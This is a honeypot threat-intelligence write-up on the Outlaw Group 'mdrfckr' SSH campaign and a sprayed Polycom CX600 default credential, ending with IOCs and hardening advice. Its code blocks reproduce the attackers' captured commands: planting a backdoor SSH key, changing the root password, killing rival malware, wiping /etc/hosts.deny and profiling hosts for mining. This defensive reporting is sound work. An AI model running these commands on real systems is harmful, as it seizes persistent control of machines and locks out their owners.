---
title: "Polycom CX600 Default Credentials Observed in SSH Credential Spray"
date: 2026-03-26
draft: false
tags: ["honeypot", "threat-intel", "cowrie", "credentials", "outlaw", "mdrfckr", "iot"]
description: "The factory default credential for the Polycom CX600 IP phone appeared 30 times in a single day's SSH credential spray — alongside a sustained mdrfckr persistence campaign. The CX600 runs Windows Embedded, not Linux, meaning the attackers have no idea what they're targeting."
---

## Overview

Buried in a day's worth of SSH credential spray data from my Cowrie honeypot
was a finding that stopped me mid-analysis: the username/password combination
`345gs5662d34:345gs5662d34` — attempted 30 times in a single observation
window. That string is the factory default administrative credential for the
**Polycom CX600 IP desk phone**.

This post documents the credential finding, the broader mdrfckr persistence
campaign it arrived alongside, and an important observation about what this
spray tells us about the attackers' awareness of their targets — which is
essentially zero.

---

## The mdrfckr Campaign

The dominant activity across today's observation window was a coordinated SSH
persistence campaign operating from dozens of rotating source IPs. The playbook
was identical across all of them:

**1. Unlock the SSH directory:**
```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
```

**2. Replace authorized_keys with their own backdoor key:**
```bash
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3Nza...oRw== mdrfckr" \
  >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```

**3. Change the root password to a randomly generated string:**
```bash
echo "root:randompassword"|chpasswd|bash
```

**4. Kill competing malware and wipe access controls:**
```bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh
pkill -9 secure.sh; pkill -9 auth.sh
echo > /etc/hosts.deny
```

**5. Profile the host for mining profitability:**
```bash
cat /proc/cpuinfo | grep name | wc -l       # CPU core count
free -m | grep Mem                          # memory
uname -m                                    # architecture
df -h | head -n 2                           # disk space
```

The SSH key comment `mdrfckr` is a known Outlaw Group campaign identifier.
I extracted the key fingerprint from the injected public key:
```bash
echo "ssh-rsa AAAAB3Nza...oRw== mdrfckr" > /tmp/mdrfckr.pub
ssh-keygen -lf /tmp/mdrfckr.pub
```

Result:
```
2048 SHA256:MkYY9qiVsFGBC5WkjoClCkwEFW5iSjcGQF7m4n4H7Cw mdrfckr (RSA)
```

This key fingerprint (`SHA256:MkYY9qiVsFGBC5WkjoClCkwEFW5iSjcGQF7m4n4H7Cw`)
has been documented in the wild since at least 2024 and appears in searches
alongside prior Outlaw Group reporting. The campaign was sustained across
multiple observation windows throughout the day, with the source IP pool
expanding from 27 unique IPs in the first two hours to over 85 by end of day —
the botnet cycling through its full node list.

A payload binary was also captured:

| Property | Value |
|---|---|
| SHA-256 | `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` |
| VT detections | 28/61 |
| Delivery | SFTP, no URL logged |

---

## The Polycom Finding

Among the credential pairs attempted across the day's sessions, one stood out:
```
345gs5662d34:345gs5662d34  —  30 attempts
```

This is the **factory default administrative credential for the Polycom CX600
IP phone** — a Microsoft Lync-optimized desk phone that was widely deployed in
enterprise environments before reaching end-of-life. The credential is
hardcoded at the factory and documented in Polycom's official support
materials.

IP phones are frequently overlooked as SSH attack surface. Network
administrators who diligently rotate passwords on servers and network equipment
often leave desk phones on factory defaults indefinitely. If the SSH management
interface is reachable from the internet — common in misconfigured or
remote-work environments — the device is trivially accessible.

### The Critical Detail: CX600 Doesn't Run Linux

Here is where the finding becomes more analytically interesting than it first
appears.

The Polycom CX600 does not run Linux. It runs **Windows Embedded Compact
(WinCE)** via Microsoft's Lync Phone Edition client. A real CX600 would not
present a Linux shell to an attacker who successfully authenticated over SSH.
The generic Linux payload the mdrfckr campaign drops — designed to install an
SSH backdoor key, kill competing miners, and profile CPU/memory for mining
profitability — would be completely useless against the actual target device.

This confirms what the broader credential spray data already suggests: **the
campaign uses no device-specific tooling and performs no target identification
before attempting credentials**. The `345gs5662d34` credential was harvested
from a known-defaults list and blasted at every open SSH port on the internet
regardless of what responded. The operators do not know and do not care whether
they are hitting a Linux server, a Windows server, a VoIP phone, a router, or
a honeypot.

This is not a sophisticated targeted attack. It is a high-volume automated
spray with no intelligence behind target selection.

---

## Scale and Persistence

The mdrfckr campaign was not a one-time scan. The same core set of source IPs
returned repeatedly across multiple observation windows throughout the day, with
consistent tooling and identical command sequences each time. By end of day the
campaign had generated over 1,400 events from 85+ unique source IPs — the
botnet rotating through its full node pool.

Notable source IPs included a **Google Cloud Platform instance**
(`34.142.110.144`) — a compromised GCP VM being used as a botnet node,
consistent with Outlaw Group's documented practice of pivoting through cloud
provider infrastructure.

Several source IPs also attempted **SSH TCP tunnel requests** (`direct-tcpip`)
targeting Google IP ranges and AWS endpoints on port 443 — attempting to use
the honeypot as a proxy for outbound connections.

---

## SSH Client Fingerprints

The day's traffic surfaced several distinct SSH client version strings
identifying different tools and actors:

| Client string | Assessment |
|---|---|
| `SSH-2.0-Go` | Automated botnet tooling — mdrfckr campaign |
| `SSH-2.0-libssh_0.10.5` / `0.11.1` | Scripted scanners |
| `SSH-2.0-paramiko_2.11.0` | Custom Python spray script |
| `SSH-2.0-OpenSSH_for_Windows_9.5` | Semi-automated, Windows operator |
| `SSH-2.0-PUTTY` | Manual or semi-manual session |
| `SSH-2.0-ZGrab ZGrab SSH Survey` | Censys/ZMap internet mapping |
| `SSH-2.0-BarkScan_1.0` | Previously undocumented scanner — see separate post |

The `paramiko_2.11.0` string indicates a custom attack script written in
Python using the Paramiko SSH library — a different toolchain from the Go-based
mdrfckr botnet, suggesting a separate actor with their own credential spray
tool.

---

## Observations

**1. Device-default credentials are actively sprayed at scale.** The Polycom
CX600 credential appearing 30 times in a single day confirms that known-default
credential lists are being systematically weaponized. Any network-connected
device — phone, printer, camera, switch — left on factory defaults should be
assumed reachable and targeted.

**2. Attackers have no target awareness.** The deployment of a Linux-specific
payload against credentials known to belong to a Windows Embedded device
demonstrates that this campaign operates entirely without target intelligence.
Volume is the strategy, not precision.

**3. The mdrfckr key has been active since at least 2024.** The consistent
reuse of the same RSA key across a sustained, multi-IP campaign suggests either
operational laziness or confidence that defenders are not acting on the known
IOC. The key fingerprint is documented and searchable — any organization running
SSH key monitoring should be blocking it.

**4. Cloud infrastructure is being abused as botnet nodes.** The presence of
a GCP IP in the source pool confirms that compromised cloud VMs are part of
Outlaw Group's scanning infrastructure. Cloud providers' abuse teams receive
reports but response time varies.

---

## Indicators of Compromise

**mdrfckr SSH key:**
- Fingerprint: `SHA256:MkYY9qiVsFGBC5WkjoClCkwEFW5iSjcGQF7m4n4H7Cw`
- Comment: `mdrfckr`
- Key type: RSA 2048

**Payload:**
- SHA-256: `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2`
- VT detections: 28/61

**Credential of note:**
- `345gs5662d34:345gs5662d34` — Polycom CX600 factory default

**Notable source IPs (partial):**
- `34.142.110.144` — Google Cloud Platform (compromised instance)
- `103.186.1.103`, `103.158.40.65`, `107.173.10.5` — core mdrfckr nodes
- `147.45.45.37`, `125.31.2.160`, `128.1.132.137` — additional campaign IPs

---

## Recommendation

Operators running Polycom CX600 phones or any end-of-life VoIP equipment
should verify factory default credentials have been changed and confirm SSH
management access is not reachable from the internet.

More broadly: any network-connected device with a known default credential —
regardless of OS, intended function, or perceived obscurity — should be treated
as a target for this class of indiscriminate spray campaign. The attackers are
not discriminating. Your printer is on their list.
